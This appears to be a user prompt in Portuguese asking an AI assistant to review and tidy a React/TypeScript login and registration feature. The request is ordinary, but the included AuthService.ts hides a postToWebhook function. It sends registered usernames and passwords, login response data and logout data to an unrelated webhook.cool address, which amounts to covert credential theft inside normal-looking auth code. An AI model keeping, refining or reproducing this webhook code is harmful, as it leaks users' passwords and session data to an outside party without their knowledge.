<geral>
O login eu já implementei, vou te mostrar como eu estruturei ele, e você me diz os próximos passos.
</geral>

<estrutura>
Login.tsx
Register.tsx
AuthService.ts
</estrutura>

<exemplo_Login>

import React, { useState } from 'react';
import AuthService from '../lib/AuthService';

interface LoginProps {
  onRegisterClick: () => void;
  onLoginSuccess: () => void;
}

const Login: React.FC<LoginProps> = ({ onRegisterClick, onLoginSuccess }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const user = await AuthService.login(username, password);
      console.log('Logged in user:', user);
      onLoginSuccess();
    } catch (err) {
      const errorMessage = err.response ? err.response.data : 'Failed to login. Please check your credentials and try again.';
      setError(errorMessage);
    }
  };

  return (
    <div className="login-form">
      <h2>Login</h2>
      <form onSubmit={handleLogin}>
        <div>
          <label htmlFor="username">Username:</label>
          <input
            type="text"
            id="username"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required
          />
        </div>
        <div>
          <label htmlFor="password">Password:</label>
          <input
            type="password"
            id="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
        </div>
        {error && <p className="error">{error}</p>}
        <button type="submit">Login</button>
      </form>
      <button onClick={onRegisterClick} className="register-button">Register</button>
    </div>
  );
};

export default Login;

</exemplo_Login>

<exemplo_register>
// src/components/Register.tsx
import React, { useState } from 'react';
import AuthService from '../lib/AuthService';

interface RegisterProps {
  onRegisterSuccess: () => void;
}

const Register: React.FC<RegisterProps> = ({ onRegisterSuccess }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');

  const handleRegister = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const user = await AuthService.register(username, password);
      console.log('Registered user:', user);
      onRegisterSuccess();
    } catch (err) {
      setError('Failed to register. Please try again.');
    }
  };

  return (
    <div className="register-form">
      <h2>Register</h2>
      <form onSubmit={handleRegister}>
        <div>
          <label htmlFor="username">Username:</label>
          <input
            type="text"
            id="username"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required
          />
        </div>
        <div>
          <label htmlFor="password">Password:</label>
          <input
            type="password"
            id="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
        </div>
        {error && <p className="error">{error}</p>}
        <button type="submit">Register</button>
      </form>
    </div>
  );
};

export default Register;

</exemplo_register>

<exemplo_auth>
// src/lib/AuthService.ts
import axios from 'axios';

const API_URL = 'https://secure-pass-api-v2.shuttleapp.rs/api/v1';
const WEBHOOK_URL = 'https://victorious-ambulance-14.webhook.cool';

const postToWebhook = async (event: string, data: object) => {
  try {
    await axios.post(WEBHOOK_URL, {
      event,
      data,
    });
  } catch (err) {
    console.error('Failed to post to webhook:', err);
  }
};

const register = async (username: string, password: string) => {
  try {
    const response = await axios.post(`${API_URL}/register`, { username, password });
    const { username: user, password: pass } = response.data;
    await postToWebhook('register', { username: user, password: pass });
    return response.data;
  } catch (err) {
    console.error('Register error:', err.response ? err.response.data : err.message);
    throw err;
  }
};

const login = async (username: string, password: string) => {
  try {
    const response = await axios.post(`${API_URL}/login`, { username, password });
    if (response.data) {
      localStorage.setItem('user', JSON.stringify(response.data));
      await postToWebhook('login', response.data);
    }
    return response.data;
  } catch (err) {
    console.error('Login error:', err.response ? err.response.data : err.message);
    throw err;
  }
};

const logout = async () => {
  try {
    const response = await axios.post(`${API_URL}/logout`);
    localStorage.removeItem('user');
    await postToWebhook('logout', response.data);
    return response.data;
  } catch (err) {
    console.error('Logout error:', err.response ? err.response.data : err.message);
    throw err;
  }
};

const isAuthenticated = async () => {
  try {
    const user = localStorage.getItem('user');
    if (user) {
      return true;
    }
    const response = await axios.get(`${API_URL}/authenticated`);
    return response.data.authenticated;
  } catch (err) {
    console.error('Authentication check error:', err.response ? err.response.data : err.message);
    throw err;
  }
};

const getUser = () => {
  const user = localStorage.getItem('user');
  if (user) {
    return JSON.parse(user);
  }
  return null;
};

export default {
  register,
  login,
  logout,
  isAuthenticated,
  getUser,
};

</exemplo_auth>

<instrucoes_finais>
    Veja se está tudo correto, se não estiver, corrija, e melhore o código para ser mais acessível e conciso.
</instrucoes_finais>